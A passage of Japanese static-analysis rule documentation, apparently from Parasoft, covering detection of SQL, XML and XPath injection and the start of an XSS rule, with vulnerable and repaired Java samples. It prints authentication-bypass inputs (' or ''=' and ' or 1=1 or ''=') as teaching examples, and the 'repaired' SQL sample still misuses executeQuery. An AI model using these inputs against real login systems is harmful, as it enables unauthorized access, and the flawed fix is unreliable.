   * prepareStatement(...)
   * setSavepoint(String)
   * nativeSQL(String)

java.sql.Statement
   * addBatch(String)
   * execute(...)
   * executeQuery(String)
   * executeUpdate(...)
   * setCursorName(String)

org.springframework.jdbc.datasource.AbstractDriverBasedDataSource
   * set*(String)
   
org.springframework.jdbc.datasource.DriverManagerDataSource
   * DriverManagerDataSource(...)

org.springframework.jdbc.datasource.SimpleDriverDataSource
   * SimpleDriverDataSource(...)
   
org.springframework.jdbc.datasource.LazyConnectionDataSourceProxy
   * getConnection(...)
   
org.springframework.jdbc.datasource.UserCredentialsDataSourceAdapter
   * getConnection(...)

org.springframework.jdbc.datasource.SingleConnectionDataSource
   * SingleConnectionDataSource(...)

org.springframework.jdbc.core.JdbcOperations
   * execute(...)
   * query.*(...)
   * update(...)
   * batchUpdate(...)

org.springframework.jdbc.core.CallableStatementCreatorFactory
   * CallableStatementCreatorFactory(...)

org.springframework.jdbc.core.PreparedStatementCreatorFactory
   * PreparedStatementCreatorFactory(...)
   * newPreparedStatementCreator(...)

org.springframework.jdbc.core.namedparam.NamedParameterJdbcOperations
   * execute(...)
   * query.*(...)
   * update(...)
   * batchUpdate(...)

org.springframework.jdbc.core.namedparam.NamedParameterJdbcTemplate
   * getParsedSql(...)
   * getPreparedStatementCreator(...)

org.springframework.jdbc.core.support.JdbcBeanDefinitionReader
   * loadBeanDefinitions(...)

org.springframework.jdbc.object.BatchSqlUpdate
   * BatchSqlUpdate(...)

org.springframework.jdbc.object.MappingSqlQuery
   * MappingSqlQuery(...)

org.springframework.jdbc.object.MappingSqlQueryWithParameters
   * MappingSqlQueryWithParameters(...)

org.springframework.jdbc.object.SqlCall
   * SqlCall(...)

org.springframework.jdbc.object.SqlFunction
   * SqlFunction(...)

org.springframework.jdbc.object.SqlOperation
   * newPreparedStatementCreator(...)

org.springframework.jdbc.object.SqlQuery
   * SqlQuery(...)

org.springframework.jdbc.object.SqlUpdate
   * SqlUpdate(...)

org.springframework.jdbc.object.UpdatableSqlQuery
   * UpdatableSqlQuery(...)
   
org.springframework.jdbc.support.AbstractFallbackSQLExceptionTranslator
   * translate(...)


</PRE>
<STRONG>
このルールが導入されたバージョン
</STRONG>
<PRE>
v8.0



</PRE>
<STRONG>
注意
</STRONG>
<PRE>
N/A



</PRE>
<STRONG>
セキュリティとの関連
</STRONG>
<PRE>

カテゴリ: 入力ベースの攻撃

OWASP の 2017 年 アプリケーション脆弱性トップ 10 の #1 「A1 - インジェクション」

検証していないデータが SQL クエリーに渡される場合、
悪意のあるプログラマはデータベースを乗っ取ることができます。



</PRE>
<STRONG>
パラメーター
</STRONG>
<PRE>
[汚染データのソース] パラメーターを使用して、汚染されたデータのソースとみなす
データソースを指定できます。以下のソースを指定できます。
   * Servlet リクエスト
   * ファイル
   * パイプ
   * リモート メソッドの戻り値
   * リフレクション メソッド
   * 環境変数およびシステム プロパティ
   * Spring 環境プロパティ
   * JMS (Java Message Service)
   * データベース
   * ストリーム指向 API (ストリーム、リーダー、チャネル)
   * コンソール
   * GUI コントロール
   * エントリ ポイント メソッドのパラメーター
   * リモート メソッドのパラメーター
   * ネイティブ メソッド
   * 検証を行っていない Struts フォーム
   * ネットワーク
   * ソケット
   * Spring HTTP リクエスト

[検証メソッド] パラメータを使用すると、汚染されたデータを検証するメソッドを指定できます。
検証メソッドのいずれかが呼び出された場合、パラメーター、ターゲット オブジェクト、戻り値は
良性であるとみなされます。
検証メソッドを設定し、影響を受けるデータを指定するには次の列に入力します。

ｰ [有効] メソッドを有効または無効にします。無効化すると、ルールはメソッドを検証メソッドとして扱いません。

- [完全修飾型名 (ワイルドカード)] 列にはメソッドを宣言する型の完全修飾名を指定する必要があります。
任意の型で宣言されたメソッドを指定するには '*' を使用します。

- [メソッド名 (ワイルドカード)] 列にはメソッドの名前を指定します。

- [+ サブクラスの定義] 列は、指定されたクラスのサブクラスで定義されている指定された名前のメソッド
に対してこの列の設定を適用するかどうかを指定します。この設定は、インスタンス メソッドおよび
非インスタンスメソッドの両方に適用されることに注意してください。
  
- [this オブジェクトは検証済み] 列を有効に設定した場合、メソッドはメソッドが呼び出されたオブジェクトを
  検証することを表します。

ｰ [検証済みのデータを返す] 列を有効に設定した場合、メソッドは戻り値を検証します。

- [検証されるパラメーター] 列に値を設定した場合、メソッドはパラメーターを無害化します。
1 から始まるパラメーターの番号をカンマで区切って指定するか、 すべてのパラメーターが
影響を受ける場合は '*' を指定します。

[数字データを汚染されているとみなさない] パラメーターをオンにすると、数字データ
(プリミティブ型およびオブジェクトの両方) が信頼されないソースから取得されている
(汚染メソッドから返されている) 場合でも、汚染されていないとみなされます。

[未検証の違反をレポートする] パラメーターをオンにすると、より多くの違反をレポート
できますが、誤検出の数も増える可能性があります。このパラメーターがオンの場合、
フロー解析は、違反に至るパスが関数の先頭から到達可能かどうかをチェックしません。
一部の複雑なケースでは、解析の深さの制限によって、フロー解析が違反の検証処理を
完了できない場合があります。その場合、このパラメーターがオンになっているときにだけ、
違反が検出されます。


</PRE>
<STRONG>
利点
</STRONG>
<PRE>
N/A



</PRE>
<STRONG>
デメリット
</STRONG>
<PRE>
N/A



</PRE>
<STRONG>
サンプルコード
</STRONG>
<PRE>

ある Web ベースのアプリケーションがあり、このアプリケーションは
ユーザー名とパスワードを Web リクエストから取得し、
そのユーザーの情報をデータベースで検索してユーザー認証に使用しているものとします。

import java.sql.Connection;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;
import javax.servlet.http.HttpServletRequest;

public class Example
{
    public void example(HttpServletRequest request, Connection sqlConnection)
        throws Exception
    {
        String sUserName = request.getParameter("userName");
        String sPassword = request.getParameter("password");
        String sQuery = "SELECT user_id, user_class, rights FROM users WHERE " + "user_name = '" + sUserName + "' and password = '" + sPassword + "'";
        Statement stmt = null;
        ResultSet rs = null;
        try {
            stmt = sqlConnection.createStatement();
            rs = stmt.executeQuery(sQuery); // 違反
            // ...
        } catch (SQLException sqle) {
            // report exception
        } finally {
            rs.close();
            stmt.close();
        }
    }
}

ユーザーがユーザー名とパスワードとして次の文字列を使用した場合、

' or ''='

SQL 文は次のようになります。

SELECT user_id, user_class, rights FROM users WHERE user_name = '' or ''='' and password = '' or ''=''

この SQL 文はすべてのユーザー情報を取得します。したがって、
悪意のあるプログラマは必要な認証情報を入力しなくても
ユーザー テーブルの 1 番目のユーザーとして認証されます。


</PRE>
<STRONG>
修正
</STRONG>
<PRE>

例 1 の場合も例 2 の場合も、ユーザー入力を検証し、
用意されたステートメントを使うことで SQL インジェクションから
アプリケーションを防御できます。

import java.sql.Connection;
import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.sql.SQLException;
import javax.servlet.http.HttpServletRequest;

public class Repair
{
    public void example(HttpServletRequest request, Connection sqlConnection)
        throws Exception
    {
        String sUserName = request.getParameter("userName");
        String sPassword = request.getParameter("password");
        String sQuery = "SELECT user_id, user_class, rights FROM users WHERE user_name=? and password=?";
        PreparedStatement stmt = null;
        ResultSet rs = null;
        try {
            stmt = sqlConnection.prepareStatement(sQuery);
            stmt.setString(1, sUserName);
            stmt.setString(2, sPassword);
            rs = stmt.executeQuery(sQuery); // 違反ではない
            // ...
        } catch (SQLException sqle) {
            // report exception
        } finally {
            rs.close();
            stmt.close();
        }
    }
}

このようにクエリーを作成すると、
JDBC が自動的にユーザー データを文字列パラメーターに変換するため、
ユーザー データが SQL 文の一部として扱われることはありません。


教育とトレーニング

SQL Injections
Video: <A target="_blank" HREF="https://vimeo.com/241883420">https://vimeo.com/241883420</A>
PDF: <A target="_blank" HREF="http://research.cs.wisc.edu/mist/SoftwareSecurityCourse/Chapters/3_8_1-SQL-Injections.pdf">http://research.cs.wisc.edu/mist/SoftwareSecurityCourse/Chapters/3_8_1-SQL-Injections.pdf</A>

Parasoft の教育パートナーが、この脆弱性と予防ベスト プラクティスに関するトレーニングを提供しています。
トレーニング リソースへのアクセス方法については、Parasoft 製品サポートにお問い合わせください。
<A target="_blank" HREF="https://app.hackedu.com/link/df350a30-f561-407d-888e-37afa2134cf5">https://app.hackedu.com/link/df350a30-f561-407d-888e-37afa2134cf5</A>



</PRE>
<STRONG>
関連資料
</STRONG>
<PRE>

OWASP Top 10 2017 (A1-Injection):
<A target="_blank" HREF="https://www.owasp.org/index.php/Top_10-2017_A1-Injection">https://www.owasp.org/index.php/Top_10-2017_A1-Injection</A>

OWASP API Security Top 10-2019
API8-Injection
<A target="_blank" HREF="https://github.com/OWASP/API-Security/blob/v1.4.1/2019/en/src/0xa8-injection.md">https://github.com/OWASP/API-Security/blob/v1.4.1/2019/en/src/0xa8-injection.md</A>

PCI Data Security Standard 3.2
6.5.1 Injection flaws
<A target="_blank" HREF="https://www.pcisecuritystandards.org/documents/PCI_DSS_v3-2-1.pdf">https://www.pcisecuritystandards.org/documents/PCI_DSS_v3-2-1.pdf</A>

2020 CWE Top 25 Most Dangerous Software Errors
CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/89.html">https://cwe.mitre.org/data/definitions/89.html</A>

SEI CERT Oracle Coding Standard for Java
IDS00-J. Prevent SQL injection  
<A target="_blank" HREF="https://wiki.sei.cmu.edu/confluence/display/java/IDS00-J.+Prevent+SQL+injection">https://wiki.sei.cmu.edu/confluence/display/java/IDS00-J.+Prevent+SQL+injection</A>

Web Application Security Consortium:
<A target="_blank" HREF="http://www.webappsec.org/projects/threat/classes/sql_injection.shtml">http://www.webappsec.org/projects/threat/classes/sql_injection.shtml</A>

OWASP Code Review Guide 2008 V1.1
Reviewing Code for SQL Injection p. 121

Tags: OWASP, PCI-DSS, CWE, CERT

</PRE><br/><hr/><br/><a class="notPrintable" id="BD.SECURITY.TDXML" href="#top">[Top]</a><br/><br/><STRONG>
XML データ インジェクションから防御する [BD.SECURITY.TDXML]
</STRONG>
<p>
<BR><BR>
<STRONG>
説明
</STRONG>
<PRE>

直接エンド ユーザーから来るデータを使って XML 文書を作成している場合、
このルールは違反をレポートします。

このルールは、汚染されたデータが
次のメソッドに渡されたときに違反をレポートします。


org.w3c.dom.Node
   * setNodeValue(String)

org.w3c.dom.Attr
   * setValue(String)

org.w3c.dom.Element
   * setAttribute(String, String)

org.w3c.dom.CharacterData
   * appendData(String)
   * insertData(int, String)
   * replaceData(int, int, String)
   * setData(String)

org.w3c.dom.Document
   * createAttribute(String)
   * createCDATASection(String)
   * createElement(String)
   * createentityReference(String)
   * createProcessingInstruction(String, String)



</PRE>
<STRONG>
このルールが導入されたバージョン
</STRONG>
<PRE>
v8.0



</PRE>
<STRONG>
注意
</STRONG>
<PRE>
N/A



</PRE>
<STRONG>
セキュリティとの関連
</STRONG>
<PRE>

カテゴリ: 入力ベースの攻撃

XML に格納されるデータは、さまざまな目的で使用できます。
XML はデータベースやストレージ システムの代替にさえもなります。
そのため XML からのデータは、SQL、XML、XPath などのような
何らかの他のリクエストを作成するために使用できます。

悪意のあるプログラマは、不正なデータを XML に渡して
危険なリクエストを実行し、個人情報や機密情報を
公開することができます。



</PRE>
<STRONG>
パラメーター
</STRONG>
<PRE>
[汚染データのソース] パラメーターを使用して、汚染されたデータのソースとみなす
データソースを指定できます。以下のソースを指定できます。
   * Servlet リクエスト
   * ファイル
   * パイプ
   * リモート メソッドの戻り値
   * リフレクション メソッド
   * 環境変数およびシステム プロパティ
   * Spring 環境プロパティ
   * JMS (Java Message Service)
   * データベース
   * ストリーム指向 API (ストリーム、リーダー、チャネル)
   * コンソール
   * GUI コントロール
   * エントリ ポイント メソッドのパラメーター
   * リモート メソッドのパラメーター
   * ネイティブ メソッド
   * 検証を行っていない Struts フォーム
   * ネットワーク
   * ソケット
   * Spring HTTP リクエスト

[検証メソッド] パラメータを使用すると、汚染されたデータを検証するメソッドを指定できます。
検証メソッドのいずれかが呼び出された場合、パラメーター、ターゲット オブジェクト、戻り値は
良性であるとみなされます。
検証メソッドを設定し、影響を受けるデータを指定するには次の列に入力します。

ｰ [有効] メソッドを有効または無効にします。無効化すると、ルールはメソッドを検証メソッドとして扱いません。

- [完全修飾型名 (ワイルドカード)] 列にはメソッドを宣言する型の完全修飾名を指定する必要があります。
任意の型で宣言されたメソッドを指定するには '*' を使用します。

- [メソッド名 (ワイルドカード)] 列にはメソッドの名前を指定します。

- [+ サブクラスの定義] 列は、指定されたクラスのサブクラスで定義されている指定された名前のメソッド
に対してこの列の設定を適用するかどうかを指定します。この設定は、インスタンス メソッドおよび
非インスタンスメソッドの両方に適用されることに注意してください。
  
- [this オブジェクトは検証済み] 列を有効に設定した場合、メソッドはメソッドが呼び出されたオブジェクトを
  検証することを表します。

ｰ [検証済みのデータを返す] 列を有効に設定した場合、メソッドは戻り値を検証します。

- [検証されるパラメーター] 列に値を設定した場合、メソッドはパラメーターを無害化します。
1 から始まるパラメーターの番号をカンマで区切って指定するか、 すべてのパラメーターが
影響を受ける場合は '*' を指定します。

[数字データを汚染されているとみなさない] パラメーターをオンにすると、数字データ
(プリミティブ型およびオブジェクトの両方) が信頼されないソースから取得されている
(汚染メソッドから返されている) 場合でも、汚染されていないとみなされます。

[未検証の違反をレポートする] パラメーターをオンにすると、より多くの違反をレポート
できますが、誤検出の数も増える可能性があります。このパラメーターがオンの場合、
フロー解析は、違反に至るパスが関数の先頭から到達可能かどうかをチェックしません。
一部の複雑なケースでは、解析の深さの制限によって、フロー解析が違反の検証処理を
完了できない場合があります。その場合、このパラメーターがオンになっているときにだけ、
違反が検出されます。


</PRE>
<STRONG>
利点
</STRONG>
<PRE>
N/A



</PRE>
<STRONG>
デメリット
</STRONG>
<PRE>
N/A



</PRE>
<STRONG>
サンプルコード
</STRONG>
<PRE>
このコードでは、
信頼されるデータだけを保持するはずの XML ストレージに、
未検証のユーザー データが入り込むことができます。

import javax.servlet.http.HttpServletRequest;
import org.w3c.dom.Document;
import org.w3c.dom.Element;

public class Example
{
    void example(HttpServletRequest req, Document document)
    {
        String sUserId = req.getParameter("userid");
        String sUserName = req.getParameter("username");
        String sDataType = req.getParameter("type");
        String sData = req.getParameter("user_data");

        String userAttrName = "User" + sUserId;
        Element user = document.createElement(userAttrName); // 違反
        user.setAttribute("name", sUserName); // VIOLATION

        Element userData = document.createElement(sDataType); // 違反
        userData.setNodeValue(sData); // 違反
        user.appendChild(userData);
    }
}



</PRE>
<STRONG>
修正
</STRONG>
<PRE>
使用前にデータを検証します。

import javax.servlet.http.HttpServletRequest;
import org.w3c.dom.Document;
import org.w3c.dom.Element;

public abstract class Repair
{
    void example(HttpServletRequest req, Document document)
    {
        String sUserId = validate(req.getParameter("userid"));
        String sUserName = validate(req.getParameter("username"));
        String sDataType = validate(req.getParameter("type"));
        String sData = validate(req.getParameter("user_data"));

        String userAttrName = "User" + sUserId;
        Element user = document.createElement(userAttrName); // 違反ではない
        user.setAttribute("name", sUserName); // 違反ではない

        Element userData = document.createElement(sDataType); // 違反ではない
        userData.setNodeValue(sData); // 違反ではない
        user.appendChild(userData);
    }

    public abstract String validate(Object obj);
}

教育とトレーニング

XML Injection
Video: <A target="_blank" HREF="https://vimeo.com/239480422">https://vimeo.com/239480422</A>
PDF: <A target="_blank" HREF="http://research.cs.wisc.edu/mist/SoftwareSecurityCourse/Chapters/3_8_4-XML-Injections.pdf">http://research.cs.wisc.edu/mist/SoftwareSecurityCourse/Chapters/3_8_4-XML-Injections.pdf</A>



</PRE>
<STRONG>
関連資料
</STRONG>
<PRE>

OWASP API Security Top 10-2019
API8-Injection
<A target="_blank" HREF="https://github.com/OWASP/API-Security/blob/v1.4.1/2019/en/src/0xa8-injection.md">https://github.com/OWASP/API-Security/blob/v1.4.1/2019/en/src/0xa8-injection.md</A>

PCI Data Security Standard 3.2
6.5.9 Cross-site request forgery (CSRF)
<A target="_blank" HREF="https://www.pcisecuritystandards.org/documents/PCI_DSS_v3-2-1.pdf">https://www.pcisecuritystandards.org/documents/PCI_DSS_v3-2-1.pdf</A>

2020 CWE Top 25 Most Dangerous Software Errors
CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/79.html">https://cwe.mitre.org/data/definitions/79.html</A>

2020 CWE Top 25 Most Dangerous Software Errors
CWE-352: Cross-Site Request Forgery (CSRF)
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/352.html">https://cwe.mitre.org/data/definitions/352.html</A>

SEI CERT Oracle Coding Standard for Java
IDS11-J. Perform any string modifications before validation
<A target="_blank" HREF="https://wiki.sei.cmu.edu/confluence/display/java/IDS11-J.+Perform+any+string+modifications+before+validation">https://wiki.sei.cmu.edu/confluence/display/java/IDS11-J.+Perform+any+string+modifications+before+validation</A>

Tags: PCI-DSS, CWE, CERT

</PRE><br/><hr/><br/><a class="notPrintable" id="BD.SECURITY.TDXPATH" href="#top">[Top]</a><br/><br/><STRONG>
XPath インジェクションから防御する [BD.SECURITY.TDXPATH]
</STRONG>
<p>
<BR><BR>
<STRONG>
説明
</STRONG>
<PRE>
直接エンド ユーザーから来るデータを XML クエリーで使用している場合、
このルールは違反をレポートします。
そのようなデータの使用は機密データを公開する恐れがあります。

このルールは、汚染されたデータが
次のメソッドに渡されたときに違反をレポートします。


W3C の定義

   org.w3c.dom.xpath.XPathEvaluator
      * createExpression(String, XPathNSResolver)
      * evaluate(String, Node, XPathNSResolver, short, Object)

   org.w3c.dom.xpath.XPathExpression
      * evaluate(Node, short, Object)
      
   org.w3c.dom.xpath.XPathNSResolver
      * lookupNamespaceURI(String)


JavaX の定義
   
   javax.xml.xpath.XPath
      * compile(String)
      * evaluate(String)
   
   javax.xml.xpath.XPathExpression
      * evaluate(String)
   
   javax.xml.xpath.XPathFunction
      * evaluate(String)
   
   javax.xml.xpath.XPathFactory
      * newInstance(String)
      * setFeature(String)


com.sun.org.apache.xpath の定義

   com.sun.org.apache.xpath.internal.ExtensionsProvider
      * extFunction(String, String, Vector, Object)

   com.sun.org.apache.xpath.internal.XPathFactory
      * create(String, SourceLocator, PrefixResolver, int)

   com.sun.org.apache.xpath.internal.Arg
      * Arg(QName, String, boolean)
      * setExpression(String)

   com.sun.org.apache.xpath.internal.CachedXPathAPI
      * eval(Node, String)
      * selectSingleNode(Node, String)

   com.sun.org.apache.xpath.internal.SourceTreeManager
      * resolveURI(Node, String)
      * getSourceTree(String, String, SourceLocator, XPathContext)

   com.sun.org.apache.xpath.internal.SourceTree
      * SourceTree(int, String)

org.apache.xpath の定義
   
   javax.xml.xpath.ExtensionsProvider
      * extFunction(String, String, Vector, Object)

   javax.xml.xpath.XPathFactory
      * create(String, SourceLocator, PrefixResolver, int)

   javax.xml.xpath.Arg
      * Arg(QName, String, boolean)
      * setExpression(String)

   javax.xml.xpath.CachedXPathAPI
      * eval(Node, String)
      * selectSingleNode(Node, String)

   javax.xml.xpath.SourceTreeManager
      * resolveURI(Node, String)
      * getSourceTree(String, String, SourceLocator, XPathContext)

   javax.xml.xpath.SourceTree
      * SourceTree(int, String)

org.jaxen の定義

   org.jaxen.Navigator
     * parseXPath(String)

   org.jaxen.dom4j.Dom4jXPath
     * Dom4jXPath(String)

   org.jaxen.dom.DOMXPath
     * DOMXPath(String)

   org.jaxen.javabean.JavaBeanXPath
     * JavaBeanXPath(String)

   org.jaxen.jdom.JDOMXPath
     * JDOMXPath(String)

   org.jaxen.xom.XOMXPath
     * XOMXPath(String)

   org.jaxen.saxpath.XPathReader
     * parse(String)



</PRE>
<STRONG>
このルールが導入されたバージョン
</STRONG>
<PRE>
v8.0



</PRE>
<STRONG>
注意
</STRONG>
<PRE>
N/A



</PRE>
<STRONG>
セキュリティとの関連
</STRONG>
<PRE>

カテゴリ: 入力ベースの攻撃

OWASP の 2017 年 アプリケーション脆弱性トップ 10 の #1 「A1 - インジェクション」を推進します。

XPath は、XML 文書の一部を参照するための言語であり、
XML 文書のノードを選択するための単純で簡潔な構文を提供します。
そのため XPath は、アプリケーションでクエリーを使って XML 文書を
参照するために利用したり、
または XML 文書に XQuery を適応するなどの大規模な操作の一部として利用したりできます。


XPath の構文は SQL クエリーに似ています。実際、
XPath を使って SQL のようなクエリーを XML 文書に対して作成するのは可能です。

もちろん、実行時に XPath クエリーを作成し、
ユーザーが入力するデータをクエリー中で使用するように
アプリケーションを作ることもできます。
悪意のあるユーザーは、クエリーにデータを挿入して、
アプリケーションが本来の動作とは異なる動作をするように
仕向けることができます。



</PRE>
<STRONG>
パラメーター
</STRONG>
<PRE>
[汚染データのソース] パラメーターを使用して、汚染されたデータのソースとみなす
データソースを指定できます。以下のソースを指定できます。
   * Servlet リクエスト
   * ファイル
   * パイプ
   * リモート メソッドの戻り値
   * リフレクション メソッド
   * 環境変数およびシステム プロパティ
   * Spring 環境プロパティ
   * JMS (Java Message Service)
   * データベース
   * ストリーム指向 API (ストリーム、リーダー、チャネル)
   * コンソール
   * GUI コントロール
   * エントリ ポイント メソッドのパラメーター
   * リモート メソッドのパラメーター
   * ネイティブ メソッド
   * 検証を行っていない Struts フォーム
   * ネットワーク
   * ソケット
   * Spring HTTP リクエスト

[検証メソッド] パラメータを使用すると、汚染されたデータを検証するメソッドを指定できます。
検証メソッドのいずれかが呼び出された場合、パラメーター、ターゲット オブジェクト、戻り値は
良性であるとみなされます。
検証メソッドを設定し、影響を受けるデータを指定するには次の列に入力します。

ｰ [有効] メソッドを有効または無効にします。無効化すると、ルールはメソッドを検証メソッドとして扱いません。

- [完全修飾型名 (ワイルドカード)] 列にはメソッドを宣言する型の完全修飾名を指定する必要があります。
任意の型で宣言されたメソッドを指定するには '*' を使用します。

- [メソッド名 (ワイルドカード)] 列にはメソッドの名前を指定します。

- [+ サブクラスの定義] 列は、指定されたクラスのサブクラスで定義されている指定された名前のメソッド
に対してこの列の設定を適用するかどうかを指定します。この設定は、インスタンス メソッドおよび
非インスタンスメソッドの両方に適用されることに注意してください。
  
- [this オブジェクトは検証済み] 列を有効に設定した場合、メソッドはメソッドが呼び出されたオブジェクトを
  検証することを表します。

ｰ [検証済みのデータを返す] 列を有効に設定した場合、メソッドは戻り値を検証します。

- [検証されるパラメーター] 列に値を設定した場合、メソッドはパラメーターを無害化します。
1 から始まるパラメーターの番号をカンマで区切って指定するか、 すべてのパラメーターが
影響を受ける場合は '*' を指定します。

[数字データを汚染されているとみなさない] パラメーターをオンにすると、数字データ
(プリミティブ型およびオブジェクトの両方) が信頼されないソースから取得されている
(汚染メソッドから返されている) 場合でも、汚染されていないとみなされます。

[未検証の違反をレポートする] パラメーターをオンにすると、より多くの違反をレポート
できますが、誤検出の数も増える可能性があります。このパラメーターがオンの場合、
フロー解析は、違反に至るパスが関数の先頭から到達可能かどうかをチェックしません。
一部の複雑なケースでは、解析の深さの制限によって、フロー解析が違反の検証処理を
完了できない場合があります。その場合、このパラメーターがオンになっているときにだけ、
違反が検出されます。


</PRE>
<STRONG>
利点
</STRONG>
<PRE>
N/A



</PRE>
<STRONG>
デメリット
</STRONG>
<PRE>
N/A



</PRE>
<STRONG>
サンプルコード
</STRONG>
<PRE>

XPath を使って XML 文書をクエリーし、
ユーザーのアカウント番号を取得する Web アプリケーションがあるものとします。
ユーザーの名前とパスワードはクライアントから取得されます。
この Web アプリケーションが値を直接 XPath クエリーに埋め込んだ場合、
それはセキュリティ ホールとなります。

(Javax XPath が起こるサンプル)

import java.io.InputStream;
import javax.servlet.http.HttpServletRequest;
import javax.xml.xpath.XPath;
import javax.xml.xpath.XPathFactory;

import org.xml.sax.InputSource;

public class Example
{
    public void violation(InputStream xmlSource, HttpServletRequest httpRequest)
        throws Exception
    {
        XPathFactory factory = XPathFactory.newInstance("...");
        XPath xpath = factory.newXPath();
        String sName = httpRequest.getParameter("userName");
        String sPasswd = httpRequest.getParameter("passwd");
        // このクエリーは、指定されたユーザー名とパスワードに対応するアカウント情報を取得する
        String sQuery = "string(//user[name/text()='" + sName + "' and password/text()='" + sPasswd + "']/account/text())";
        String sAccount = xpath.evaluate(sQuery, new InputSource(xmlSource)); // 違反
        // ...
    }
}

悪意のあるプログラマは XPath の式をインジェクトできます。たとえば
ユーザー名として次の値を与えることができます。

  ' or 1=1 or ''='

この式は、オリジナルの XPath のセマンティックスを変更し、
XML 文書の最初のアカウント番号を必ず返すようにします。

この場合、クエリーは次のようになります。

string(//user[name/text()='' or 1=1 or ''='' and
password/text()='foobar']/account/text())

すべてのノードで述部が true に評価されるため、
これは次のことと同じです。

string(//user/account/text())


//user/account/text() の 1 番目のインスタンスを引き起こします。

その結果、悪意のあるプログラマはユーザー名とパスワードを入力しなくても
 XML 文書の 1 番目にリストされたユーザーとしてアプリケーションにログインできます。



</PRE>
<STRONG>
修正
</STRONG>
<PRE>
使用する前にデータを検証します。

import java.io.InputStream;
import javax.servlet.http.HttpServletRequest;
import javax.xml.xpath.XPath;
import javax.xml.xpath.XPathFactory;
import org.xml.sax.InputSource;

public abstract class Repair
{
    public void violation(InputStream xmlSource, HttpServletRequest httpRequest)
        throws Exception
    {
        XPathFactory factory = XPathFactory.newInstance("...");
        XPath xpath = factory.newXPath();
        String sName = validate(httpRequest.getParameter("userName"));
        String sPasswd = validate(httpRequest.getParameter("passwd"));
        // このクエリーは、指定されたユーザー名とパスワードに対応するアカウント情報を取得する
        String sQuery = "string(//user[name/text()='" + sName + "' and password/text()='" + sPasswd + "']/account/text())";
        String sAccount = xpath.evaluate(sQuery, new InputSource(xmlSource)); // 違反ではない
        // ...
    }

    public abstract String validate(Object obj);
}


教育とトレーニング

Introduction to Injection Attacks
Video: <A target="_blank" HREF="https://vimeo.com/262069083">https://vimeo.com/262069083</A>
PDF: <A target="_blank" HREF="http://research.cs.wisc.edu/mist/SoftwareSecurityCourse/Chapters/3_8-Intro-to-Injections.pdf">http://research.cs.wisc.edu/mist/SoftwareSecurityCourse/Chapters/3_8-Intro-to-Injections.pdf</A>

Parasoft の教育パートナーが、この脆弱性と予防ベスト プラクティスに関するトレーニングを提供しています。
トレーニング リソースへのアクセス方法については、Parasoft 製品サポートにお問い合わせください。
<A target="_blank" HREF="https://app.hackedu.com/link/f70b53f3-831b-4855-8186-99988da19aa0">https://app.hackedu.com/link/f70b53f3-831b-4855-8186-99988da19aa0</A>



</PRE>
<STRONG>
関連資料
</STRONG>
<PRE>

OWASP 2017 Top 10: A1-Injection
<A target="_blank" HREF="https://www.owasp.org/index.php/Top_10-2017_A1-Injection">https://www.owasp.org/index.php/Top_10-2017_A1-Injection</A>

OWASP API Security Top 10-2019
API8-Injection
<A target="_blank" HREF="https://github.com/OWASP/API-Security/blob/v1.4.1/2019/en/src/0xa8-injection.md">https://github.com/OWASP/API-Security/blob/v1.4.1/2019/en/src/0xa8-injection.md</A>

PCI Data Security Standard 3.2
6.5.1 Injection flaws
<A target="_blank" HREF="https://www.pcisecuritystandards.org/documents/PCI_DSS_v3-2-1.pdf">https://www.pcisecuritystandards.org/documents/PCI_DSS_v3-2-1.pdf</A>

CWE-643: Improper Neutralization of Data within XPath Expressions ('XPath Injection')
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/643.html">https://cwe.mitre.org/data/definitions/643.html</A>

CWE-652: Improper Neutralization of Data within XQuery Expressions ('XQuery Injection')
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/652.html">https://cwe.mitre.org/data/definitions/652.html</A>

CWE-829: Inclusion of Functionality from Untrusted Control Sphere
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/829.html">https://cwe.mitre.org/data/definitions/829.html</A>

Web Application Security Consortium:
<A target="_blank" HREF="http://www.webappsec.org/projects/threat/classes/xpath_injection.shtml">http://www.webappsec.org/projects/threat/classes/xpath_injection.shtml</A>

Tags: OWASP, PCI-DSS, CWE

</PRE><br/><hr/><br/><a class="notPrintable" id="BD.SECURITY.TDXSS" href="#top">[Top]</a><br/><br/><STRONG>
XSS の脆弱性の可能性から防御する [BD.SECURITY.TDXSS]
</STRONG>
<p>
<BR><BR>
<STRONG>
説明
</STRONG>
<PRE>

このルールは、XSS の脆弱性の可能性を検出します。

このルールは、汚染されたデータが
次のメソッドに渡されたときに違反をレポートします。

javax.servlet.ServletOutputStream
   * void print(...) methods
   * void println(...) methods
   * void write(...) methods

java.io.PrintWriter
   * void print(...) methods
   * void println(...) methods
   * void write(...) methods



</PRE>
<STRONG>
このルールが導入されたバージョン
</STRONG>
<PRE>
v8.0



</PRE>
<STRONG>
注意
</STRONG>
<PRE>

N/A



</PRE>
<STRONG>
セキュリティとの関連
</STRONG>
<PRE>

カテゴリ: 入力ベースの攻撃

OWASP の 2013 年 アプリケーション脆弱性トップ 10 の #7 「A7 - クロス サイト スクリプティング (XSS)」
を推進するのに役立ちます。

クロスサイト スクリプティング (XSS) は、
攻撃者による実行可能コードが Web サイトに表示され、
これがユーザーのブラウザーにロードされるセキュリティ攻撃です。
このコードは、HTML/JavaScript、VBSript、ActiveX、Java、Flash などで作成できます。

ユーザのブラウザーで実行されたコードは、ホストする Web サイトの
セキュリティ コンテキスト (セキュリティ ゾーン) で実行されるため、
不正に上位の権限を取得できます。上記の権限によって、コードは
ブラウザーがアクセス可能なあらゆる機密データの参照、変更、転送できます。
XSS の攻撃を受けたユーザーのブラウザーは、見た目はオリジナルとまったく同じである
別の場所にリダイレクトされ、アカウントのハイジャック (Cookie の盗難) または
ログイン/パスワード情報の盗難に使用されます。

XSS の攻撃には、非永続型と永続型の 2 種類があります。
非永続型の攻撃は、不正なコードがあるリンクをユーザーに訪問させます。
ユーザーがリンクを訪問したときに URL に埋め込まれたコードが
ユーザーのブラウザーでエコーされて実行されます。
永続型の攻撃では、不正なコードが Web サイトにサブミットされて一定期間格納されます。
不正なコードがある Web ページを参照するだけで、ユーザーは XSS の攻撃を受けます。
